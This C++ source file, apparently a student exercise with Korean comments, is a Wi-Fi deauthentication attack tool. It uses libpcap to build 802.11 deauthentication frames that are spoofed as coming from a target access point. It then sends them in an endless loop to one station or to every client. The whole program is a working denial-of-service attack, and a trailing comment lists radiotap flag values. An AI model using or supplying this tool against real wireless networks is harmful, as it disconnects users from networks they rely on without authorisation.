#include <iostream>
#include <iomanip>
#include <unistd.h>
#include <map>
#include <pcap.h>
#include "beacon.h"

using namespace std;

//https://support.zyxel.eu/hc/en-us/articles/360009469759-What-is-the-meaning-of-802-11-Deauthentication-Reason-Codes-
#define Deauthentication 0x0C
#define ReceivedFromNonassociatedStation 7 // Class 3 frame received from nonassociated station -> Client attempted to transfer data before it was associated.

// 참고한 duration : https://x4bx54.medium.com/use-802-11w-or-wpa3-to-prevent-de-authentication-attacks-in-your-wi-fi-network-4ce63ab20033

map<Mac, BEdata> data;

typedef struct DeauthFrame {
	RTHDR radiotap;
	uint8_t padding[3] = {0};
	BF_ deauth;
	uint16_t reason;
} DF;


ostream& operator<<(ostream& os, const Mac& mac){
	return os<<std::string(mac);
}

ostream& operator<<(ostream& os,const map<Mac, BEdata>& data){
	os<<setfill('-')<<setw(80)<<"-"<<'\n';
	os<<setfill(' ')<<left<<setw(20)<<"BSSID"<<setw(10)<<"BEACON"<<setw(40)<<"ESSID"<<'\n';
	
	for(auto k:data){
		os<<setw(20)<<left<<k.first<<setw(10)<<left<<k.second.beacon<<setw(40)<<left<<k.second.essid<<'\n';
	}
	os<<setfill('-')<<setw(80)<<"-"<<'\n';
	
	return os;
}



int main(int argc, char* argv[]){
	
    if(argc != 3 && argc != 4) {
        puts("Input Error!!");
        puts("syntax : deauth-attack <interface> <ap mac> [<station mac>] [-auth]");
		puts("sample : deauth-attack mon0 00:11:22:33:44:55 66:77:88:99:AA:BB");
		return -1;
	}
	
    char *dev = argv[1];
	
    Mac ap = Mac(argv[2]);
    Mac station = (argc==4 ? Mac(argv[3]) : Mac::broadcastMac()); //Mac ("FF:FF ~")
    //Mac station = (argc == 4 ? Mac(argv[3]) : Mac("FF:FF:FF:FF:FF:FF"));
	
    char errbuf[PCAP_ERRBUF_SIZE];

	pcap_t *handle = pcap_open_live(dev, BUFSIZ, 1, 100, errbuf);
	if (handle == NULL){
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}

	DF packet;

    packet.radiotap.itVersion = 0;
	packet.radiotap.itPad = 0;
	packet.radiotap.itLen = sizeof(RTHDR);
	packet.radiotap.itPresent = 0x00028000;

    packet.deauth.version = 0;
	packet.deauth.type = 0;
	packet.deauth.subtype = Deauthentication;
	packet.deauth.flags = 0;
	packet.deauth.duration = 314; //microseconds
	packet.deauth.destMAC = station;
	packet.deauth.srcMAC = ap;
	packet.deauth.BSSID = ap;
	packet.deauth.seq_ctl = 0;

	packet.reason = ReceivedFromNonassociatedStation;

	while(true){
        //DF -> u_char 형식으로 packet의 데이터 값을 받아야 함. (배열 선언으로 된게 많아보였음! buffer..!)
		if(pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(DF)) != 0){
            fprintf(stderr,"\nError sending the packet: \n", pcap_geterr(handle));
            return 0;
        }
        sleep(5);
	}

	pcap_close(handle);

	return 0;
}


/*presentFlat 참고용
https://libtins.github.io/docs/latest/d7/d0e/classTins_1_1RadioTap.html
TSFT = 1 << 0, 
TSTF = 1 << 0, 
FLAGS = 1 << 1, 
RATE = 1 << 2, 
CHANNEL = 1 << 3, 
FHSS = 1 << 4, 
DBM_SIGNAL = 1 << 5, 
DBM_NOISE = 1 << 6, 
LOCK_QUALITY = 1 << 7, 
TX_ATTENUATION = 1 << 8, 
B_TX_ATTENUATION = 1 << 9, 
DBM_TX_ATTENUATION = 1 << 10, 
ANTENNA = 1 << 11, 
DB_SIGNAL = 1 << 12, 
DB_NOISE = 1 << 13, 
RX_FLAGS = 1 << 14, 
TX_FLAGS = 1 << 15, 
DATA_RETRIES = 1 << 17, 
XCHANNEL = 1 << 18, 
CHANNEL_PLUS = 1 << 18, 
MCS = 1 << 19,

AMpdu = 1 << 20,
Vht = 1 << 21,
Timestamp = 1 << 22,
He = 1 << 23,
HeMu = 1 << 24,
HeMuOtherUser = 1 << 25,
ZeroLenghPsdu = 1 << 26,
LSig = 1 << 27,
Tlv = 1 << 28, https://www.radiotap.org/fields/TLV.html
RadiotapNamespace = 1 << 29,
VendorNamespace = 1 << 30,
Ext = 1 << 31

*/
